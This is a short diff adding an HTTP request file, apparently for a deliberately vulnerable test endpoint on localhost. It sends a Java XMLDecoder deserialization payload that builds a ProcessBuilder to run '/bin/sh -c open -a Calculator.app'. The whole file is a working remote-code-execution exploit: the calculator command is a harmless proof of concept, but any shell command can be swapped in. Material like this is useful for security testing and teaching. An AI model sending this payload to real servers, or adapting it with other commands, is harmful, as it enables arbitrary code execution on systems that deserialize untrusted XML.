@@ -1,0 +1,21 @@
+###
+POST /deserialization/javaBean/case1 HTTP/1.1
+Host: 127.0.0.1:8080
+Content-Type: text/plain
+
+<java>
+    <object class="java.lang.ProcessBuilder">
+        <array class="java.lang.String" length="3" >
+            <void index="0">
+                <string>/bin/sh</string>
+            </void>
+            <void index="1">
+                <string>-c</string>
+            </void>
+            <void index="2">
+                <string>open -a Calculator.app</string>
+            </void>
+        </array>
+        <void method="start"/>
+    </object>
+</java>
